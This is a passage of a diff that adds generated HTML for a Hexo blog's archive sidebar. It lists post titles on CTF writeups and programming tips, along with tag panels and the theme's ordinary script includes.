+            <a class="archive-post-title" href="/2023/12/28/newstar2023-week1/">newstar2023_week1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span>
+            <a class="archive-post-title" href="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/">exp本地不通远程通的问题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span>
+            <a class="archive-post-title" href="/2023/09/18/cdn%E7%BB%95%E8%BF%87%E5%A4%A7%E5%85%A8tips%E6%80%9D%E8%B7%AF/">cdn绕过大全tips思路</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span>
+            <a class="archive-post-title" href="/2023/09/18/cnss2023/">cnss2023</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2023/09/18/hello-world/">Hello World</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span>
+            <a class="archive-post-title" href="/2023/09/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">php弱类型</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span>
+            <a class="archive-post-title" href="/2023/09/18/python3-venv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8-%E8%A7%A3%E5%86%B3%E5%8C%85%E7%AE%A1%E7%90%86%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/">python3-venv虚拟环境使用-解决包管理版本控制混乱的问题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span>
+            <a class="archive-post-title" href="/2023/09/18/sictf2023r2/">sictf2023</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="ctf writeup">
+                <span class="iconfont-archer">&#xe606;</span>
+                ctf writeup
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="misc">
+                <span class="iconfont-archer">&#xe606;</span>
+                misc
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://nyyyddddn.github.io",
+        root: siteMetaRoot,
+        author: "nyyyddddn"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
